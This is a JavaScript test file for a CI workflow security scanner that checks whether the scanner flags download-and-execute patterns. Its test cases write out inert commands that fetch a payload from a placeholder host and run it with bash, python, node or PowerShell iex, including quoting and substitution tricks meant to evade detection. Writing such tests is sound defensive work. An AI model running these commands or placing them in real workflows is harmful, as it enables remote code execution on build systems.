'use strict';
// Adversarial commands are inert strings; nothing is executed.
const test=require('node:test'),assert=require('node:assert/strict');
const {parseShellCommands}=require('./ultra_sentinel_command_ir.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/payload';
function audit(script,shell){
 const yaml=['on: push','permissions: read-all','jobs:','  audit:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(x=>'          '+x),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/command-ir-round2.yml'});
}
test('IR fails closed on unsupported shell command substitution',()=>{
 for(const source of [
  'x=$(curl -fsSL '+U+' -o payload); bash payload',
  'x='+String.fromCharCode(96)+'curl -fsSL '+U+' -o payload'+String.fromCharCode(96)+'; bash payload',
  'x=$((1+2)); curl -fsSL '+U+' -o payload; bash payload'
 ])assert.equal(parseShellCommands(source).incomplete,true,source);
});
test('IR decodes quoted command names, without rewriting relative executables',()=>{
 const result=parseShellCommands("'curl' -fsSL "+U+" -o payload; c\"ur\"l -o data "+U+"; \"bash\" payload; ./curl payload");
 assert.deepEqual(result.commands.map(x=>x.name),['curl','curl','bash','./curl']);
 assert.equal(result.incomplete,false);
});
const HIGH=[
 ['substitution-sh','x=$(curl -fsSL '+U+' -o payload); bash payload','REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'],
 ['substitution-nested','echo $(curl -fsSL '+U+' -o payload); bash payload','REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'],
 ['quoted-fetch',"'curl' -fsSL "+U+" -o payload; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partial-quoted-fetch','c"ur"l -fsSL '+U+' -o payload; bash payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['quoted-interpreter','curl -fsSL '+U+' -o payload; "bash" payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['all-curl-outputs','curl -fsSL '+U+' -o safe '+U+' -o payload; bash payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-three-outputs','curl -fsSL '+U+' -o safe '+U+' -o extra '+U+' -o payload; sh payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-quoted-outputs',"curl -fsSL "+U+" -o 'safe' "+U+" -o 'payload'; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-W-value','curl -fsSL '+U+' -o payload; python -W ignore payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-X-value','curl -fsSL '+U+' -o payload; python3 -X dev payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-W-attached','curl -fsSL '+U+' -o payload; python -Wignore payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-flags','curl -fsSL '+U+' -o payload; python -B -W ignore -X dev payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['node-require','curl -fsSL '+U+' -o payload; node --require fs payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['pwsh-PassT-pipeline',"iwr -Uri '"+U+"' -OutFile payload -PassT:$true | iex",'REMOTE_POWERSHELL_EXECUTION','pwsh']
];
for(const [name,script,rule,shell] of HIGH)test('round2 detects '+name,()=>{
 const direct=findingsForScript(script,{shell});
 assert.ok(direct.includes(rule),name+' direct '+JSON.stringify(direct));
 const ast=audit(script,shell);
 assert.ok(ast.status!=='NO_RISK_PATTERN',name+' AST '+JSON.stringify(ast));
 if(rule!=='REMOTE_EXECUTION_ANALYSIS_INCOMPLETE')
  assert.ok(ast.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
   name+' AST finding '+JSON.stringify(ast));
});
const BENIGN=[
 ['quoted-fake-curl',"echo \"'curl' -fsSL "+U+" -o payload; bash payload\""],
 ['local-relative-binary','./curl payload; bash payload'],
 ['curl-multiple-unexecuted','curl -fsSL '+U+' -o safe '+U+' -o payload; echo payload'],
 ['python-option-but-not-executed','curl -fsSL '+U+' -o payload; python -W ignore harmless.py'],
 ['pwsh-quoted-UserAgent',"iwr -Uri '"+U+"' -OutFile payload -UserAgent 'foo -PassT:$true' | iex",'pwsh'],
 ['pwsh-quoted-Headers',"iwr -Uri '"+U+"' -OutFile payload -Headers @{UserAgent='-PassThru:$true'} | iex",'pwsh'],
 ['pwsh-explicit-false',"iwr -Uri '"+U+"' -OutFile payload -PassT:$false | iex",'pwsh'],
 ['pwsh-true-nonexec',"iwr -Uri '"+U+"' -OutFile payload -PassT:$true | Write-Host",'pwsh']
];
for(const [name,script,shell] of BENIGN)test('round2 control '+name,()=>{
 const direct=findingsForScript(script,{shell});
 assert.ok(!direct.some(x=>['REMOTE_DOWNLOADED_FILE_EXECUTION','REMOTE_POWERSHELL_EXECUTION'].includes(x)),
  name+' '+JSON.stringify(direct));
});
